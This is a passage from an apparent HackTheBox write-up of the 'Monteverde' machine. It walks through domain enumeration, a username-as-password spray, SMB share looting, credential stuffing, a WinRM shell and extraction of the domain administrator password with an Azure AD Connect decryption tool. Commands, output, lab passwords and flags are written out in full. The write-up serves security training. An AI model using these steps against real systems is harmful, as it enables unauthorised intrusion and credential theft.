group:[Windows Authorization Access Group] rid:[0x230]
group:[Terminal Server License Servers] rid:[0x231]
group:[Users] rid:[0x221]
group:[Guests] rid:[0x222]
group:[Remote Desktop Users] rid:[0x22b]
group:[Network Configuration Operators] rid:[0x22c]
group:[Performance Monitor Users] rid:[0x22e]
group:[Performance Log Users] rid:[0x22f]
group:[Distributed COM Users] rid:[0x232]
group:[IIS_IUSRS] rid:[0x238]
group:[Cryptographic Operators] rid:[0x239]
group:[Event Log Readers] rid:[0x23d]
group:[Certificate Service DCOM Access] rid:[0x23e]
group:[RDS Remote Access Servers] rid:[0x23f]
group:[RDS Endpoint Servers] rid:[0x240]
group:[RDS Management Servers] rid:[0x241]
group:[Hyper-V Administrators] rid:[0x242]
group:[Access Control Assistance Operators] rid:[0x243]
group:[Remote Management Users] rid:[0x244]
group:[Storage Replica Administrators] rid:[0x246]

[+] Getting builtin group memberships:
Group &#39;IIS_IUSRS&#39; (RID: 568) has member: Couldn&#39;t lookup SIDs
Group &#39;Remote Management Users&#39; (RID: 580) has member: Couldn&#39;t lookup SIDs
Group &#39;Pre-Windows 2000 Compatible Access&#39; (RID: 554) has member: Couldn&#39;t lookup SIDs
Group &#39;Windows Authorization Access Group&#39; (RID: 560) has member: Couldn&#39;t lookup SIDs
Group &#39;Users&#39; (RID: 545) has member: Couldn&#39;t lookup SIDs
Group &#39;Guests&#39; (RID: 546) has member: Couldn&#39;t lookup SIDs

[+] Getting local groups:
group:[Cert Publishers] rid:[0x205]
group:[RAS and IAS Servers] rid:[0x229]
group:[Allowed RODC Password Replication Group] rid:[0x23b]
group:[Denied RODC Password Replication Group] rid:[0x23c]
group:[DnsAdmins] rid:[0x44d]
group:[SQLServer2005SQLBrowserUser$MONTEVERDE] rid:[0x44f]
group:[ADSyncAdmins] rid:[0x451]
group:[ADSyncOperators] rid:[0x452]
group:[ADSyncBrowse] rid:[0x453]
group:[ADSyncPasswordSet] rid:[0x454]

[+] Getting local group memberships:
Group &#39;Denied RODC Password Replication Group&#39; (RID: 572) has member: Couldn&#39;t lookup SIDs
Group &#39;ADSyncAdmins&#39; (RID: 1105) has member: Couldn&#39;t lookup SIDs

[+] Getting domain groups:
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[DnsUpdateProxy] rid:[0x44e]
group:[Azure Admins] rid:[0xa29]
group:[File Server Admins] rid:[0xa2e]
group:[Call Recording Admins] rid:[0xa2f]
group:[Reception] rid:[0xa30]
group:[Operations] rid:[0xa31]
group:[Trading] rid:[0xa32]
group:[HelpDesk] rid:[0xa33]
group:[Developers] rid:[0xa34]

[+] Getting domain group memberships:
Group &#39;Operations&#39; (RID: 2609) has member: MEGABANK\smorgan
Group &#39;Group Policy Creator Owners&#39; (RID: 520) has member: MEGABANK\Administrator
Group &#39;Domain Guests&#39; (RID: 514) has member: MEGABANK\Guest
Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\Administrator
Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\krbtgt
Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\AAD_987d7f2f57d2
Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\mhope
Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\SABatchJobs
Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\svc-ata
Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\svc-bexec
Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\svc-netapp
Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\dgalanos
Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\roleary
Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\smorgan
Group &#39;Trading&#39; (RID: 2610) has member: MEGABANK\dgalanos
Group &#39;Azure Admins&#39; (RID: 2601) has member: MEGABANK\Administrator
Group &#39;Azure Admins&#39; (RID: 2601) has member: MEGABANK\AAD_987d7f2f57d2
Group &#39;Azure Admins&#39; (RID: 2601) has member: MEGABANK\mhope
Group &#39;HelpDesk&#39; (RID: 2611) has member: MEGABANK\roleary

 =======================================================================
|    Users on 10.10.10.172 via RID cycling (RIDS: 500-550,1000-1050)    |
 =======================================================================
[E] Couldn&#39;t get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.

 =============================================
|    Getting printer info for 10.10.10.172    |
 =============================================
Unable to initialize messaging context
Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED

enum4linux complete on Wed Mar 25 22:31:39 2020

$ GetNPUsers.py -no-pass -dc-ip 10.10.10.172 MEGABANK/smorgan
-&gt; nothing
</code></pre><p>Thanks to <a href=https://github.com/CiscoCXSecurity/enum4linux>enum4linux</a>, we now have all users and groups information we need.</p><p>Let&rsquo;s try a quick bruteforce where user = password with <a href=https://github.com/byt3bl33d3r/CrackMapExec>CrackMapExec</a>.</p><pre tabindex=0><code>$ cme smb 10.10.10.172 -u users.txt -p users.txt
...
SMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK\SABatchJobs:SABatchJobs
</code></pre><h3 id=network-reconnaissance>Network reconnaissance<a hidden class=anchor aria-hidden=true href=#network-reconnaissance>#</a></h3><p>We found the password <code>SABatchJobs</code> use the username as password.
Let&rsquo;s use this account for enumerating some shares:</p><pre tabindex=0><code>$ cme smb 10.10.10.172 -u SABatchJobs -p SABatchJobs --shares
SMB         10.10.10.172    445    MONTEVERDE       [*] Windows 10.0 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK) (signing:True) (SMBv1:False)
SMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK\SABatchJobs:SABatchJobs
SMB         10.10.10.172    445    MONTEVERDE       [+] Enumerated shares
SMB         10.10.10.172    445    MONTEVERDE       Share           Permissions     Remark
SMB         10.10.10.172    445    MONTEVERDE       -----           -----------     ------
SMB         10.10.10.172    445    MONTEVERDE       ADMIN$                          Remote Admin
SMB         10.10.10.172    445    MONTEVERDE       azure_uploads   READ
SMB         10.10.10.172    445    MONTEVERDE       C$                              Default share
SMB         10.10.10.172    445    MONTEVERDE       E$                              Default share
SMB         10.10.10.172    445    MONTEVERDE       IPC$            READ            Remote IPC
SMB         10.10.10.172    445    MONTEVERDE       NETLOGON        READ            Logon server share
SMB         10.10.10.172    445    MONTEVERDE       SYSVOL          READ            Logon server share
SMB         10.10.10.172    445    MONTEVERDE       users$          READ
</code></pre><p>Let&rsquo;s find is there are valuable files in <code>users$</code> share.</p><pre tabindex=0><code>$ smbclient &#39;\\10.10.10.172\users$&#39; -U &#39;SABatchJobs&#39;
Unable to initialize messaging context
Enter WORKGROUP\SABatchJobs&#39;s password:
Try &#34;help&#34; to get a list of possible commands.
smb: \&gt; recuse on
recuse: command not found
smb: \&gt; recurse on
smb: \&gt; prompt off
smb: \&gt; mget *
getting file \mhope\azure.xml of size 1212 as azure.xml (4,8 KiloBytes/sec) (average 4,8 KiloBytes/sec)
</code></pre><p>Let&rsquo;s read <code>/mhope/azure.xml</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#f92672>&lt;Objs</span> <span style=color:#a6e22e>Version=</span><span style=color:#e6db74>&#34;1.1.0.1&#34;</span> <span style=color:#a6e22e>xmlns=</span><span style=color:#e6db74>&#34;http://schemas.microsoft.com/powershell/2004/04&#34;</span><span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span>  <span style=color:#f92672>&lt;Obj</span> <span style=color:#a6e22e>RefId=</span><span style=color:#e6db74>&#34;0&#34;</span><span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;TN</span> <span style=color:#a6e22e>RefId=</span><span style=color:#e6db74>&#34;0&#34;</span><span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span>      <span style=color:#f92672>&lt;T&gt;</span>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential<span style=color:#f92672>&lt;/T&gt;</span>
</span></span><span style=display:flex><span>      <span style=color:#f92672>&lt;T&gt;</span>System.Object<span style=color:#f92672>&lt;/T&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;/TN&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;ToString&gt;</span>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential<span style=color:#f92672>&lt;/ToString&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;Props&gt;</span>
</span></span><span style=display:flex><span>      <span style=color:#f92672>&lt;DT</span> <span style=color:#a6e22e>N=</span><span style=color:#e6db74>&#34;StartDate&#34;</span><span style=color:#f92672>&gt;</span>2020-01-03T05:35:00.7562298-08:00<span style=color:#f92672>&lt;/DT&gt;</span>
</span></span><span style=display:flex><span>      <span style=color:#f92672>&lt;DT</span> <span style=color:#a6e22e>N=</span><span style=color:#e6db74>&#34;EndDate&#34;</span><span style=color:#f92672>&gt;</span>2054-01-03T05:35:00.7562298-08:00<span style=color:#f92672>&lt;/DT&gt;</span>
</span></span><span style=display:flex><span>      <span style=color:#f92672>&lt;G</span> <span style=color:#a6e22e>N=</span><span style=color:#e6db74>&#34;KeyId&#34;</span><span style=color:#f92672>&gt;</span>00000000-0000-0000-0000-000000000000<span style=color:#f92672>&lt;/G&gt;</span>
</span></span><span style=display:flex><span>      <span style=color:#f92672>&lt;S</span> <span style=color:#a6e22e>N=</span><span style=color:#e6db74>&#34;Password&#34;</span><span style=color:#f92672>&gt;</span>4n0therD4y@n0th3r$<span style=color:#f92672>&lt;/S&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;/Props&gt;</span>
</span></span><span style=display:flex><span>  <span style=color:#f92672>&lt;/Obj&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;/Objs&gt;</span>
</span></span></code></pre></div><p>It seems a password is leaked, let&rsquo;s try credential stuffing: maybe we can
re-use one of the accounts.</p><pre tabindex=0><code>$ cme smb 10.10.10.172 -u ../users.txt -p &#39;4n0therD4y@n0th3r$&#39;
SMB         10.10.10.172    445    MONTEVERDE       [*] Windows 10.0 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK) (signing:True) (SMBv1:False)
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\AAD_987d7f2f57d2:4n0therD4y@n0th3r$ STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK\mhope:4n0therD4y@n0th3r$
</code></pre><p>Cool <code>mhope</code> is using this password too.</p><p>As winRM port is open, we can authenticate and gain shell access with
<a href=https://github.com/Hackplayers/evil-winrm>evil-winrm</a>.</p><pre tabindex=0><code>$ evil-winrm -i 10.10.10.172 -u &#39;mhope&#39; -p &#39;4n0therD4y@n0th3r$&#39;

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\mhope\Documents&gt; gc ../Desktop/user.txt
4961976bd7d8f4eeb2ce3705e2f212f2
</code></pre><h3 id=privilege-escalation--mhope-to-administrator>Privilege Escalation : mhope to Administrator<a hidden class=anchor aria-hidden=true href=#privilege-escalation--mhope-to-administrator>#</a></h3><p>Then there is a hidden folder:</p><pre tabindex=0><code>*Evil-WinRM* PS C:\Users\mhope\.Azure&gt; dir -Force

    Directory: C:\Users\mhope\.Azure

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         1/3/2020   5:35 AM                ErrorRecords
-a----         1/3/2020   5:31 AM             34 AzurePSDataCollectionProfile.json
-a----         1/3/2020   5:35 AM           2794 AzureRmContext.json
-a----         1/3/2020   5:31 AM            191 AzureRmContextSettings.json
-a----         1/3/2020   5:36 AM           7896 TokenCache.dat
</code></pre><p>We have azure powershell already loaded <a href=https://github.com/Azure/azure-powershell>https://github.com/Azure/azure-powershell</a></p><pre tabindex=0><code>*Evil-WinRM* PS C:\Users\mhope\.Azure&gt; Get-AzContext

Name                                     Account                                              SubscriptionName                                    Environment                                         TenantId
----                                     -------                                              ----------------                                    -----------                                         --------
372efea9-7bc4-4b76-8839-984b45edfb98 ... john@a67632354763outlook.onmicrosoft.com                                                                 AzureCloud                                          372efea9-7bc4-4b76-8839-984b45edfb98
</code></pre><p>There is great resources and tools about exploiting <em>Azure AD Connect</em>.</p><ul><li><a href=https://vbscrub.video.blog/2020/01/14/azure-ad-connect-database-exploit-priv-esc/>Azure AD Connect Database Exploit (Priv Esc)</a></li><li><a href=https://github.com/fox-it/adconnectdump>Azure AD Connect password extraction</a></li></ul><p>You can fidn a pre-compiled version of <code>AdSyncDecrypt</code> <a href=https://github.com/VbScrub/AdSyncDecrypt/releases>here</a>.</p><pre tabindex=0><code>C:/Users/mhope/.Azure/AdDecrypt.exe -FullSQL

======================
AZURE AD SYNC CREDENTIAL DECRYPTION TOOL
Based on original code from: https://github.com/fox-it/adconnectdump
======================

Opening database connection...
Executing SQL commands...
Closing database connection...
Decrypting XML...
Parsing XML...
Finished!

DECRYPTED CREDENTIALS:
Username: administrator
Password: d0m@in4dminyeah!
Domain: MEGABANK.LOCAL

*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; gc ../Desktop/root.txt
12909612d25c8dcf6e5a07d1a804a0bc
</code></pre></div><footer class=post-footer><ul class=post-tags><li><a href=https://s4ch.github.io/tags/ctf/>Ctf</a></li><li><a href=https://s4ch.github.io/tags/hackthebox/>Hackthebox</a></li><li><a href=https://s4ch.github.io/tags/penetration-testing/>Penetration-Testing</a></li><li><a href=https://s4ch.github.io/tags/writeup/>Writeup</a></li><li><a href=https://s4ch.github.io/tags/windows/>Windows</a></li><li><a href=https://s4ch.github.io/tags/medium/>Medium</a></li></ul><nav class=paginav><a class=prev href=https://s4ch.github.io/writeups/hackthebox/servmon/><span class=title>« Prev</span><br><span>ServMon </span></a><a class=next href=https://s4ch.github.io/writeups/hackthebox/nest/><span class=title>Next »</span><br><span>Nest</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://s4ch.github.io/>CyFun</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>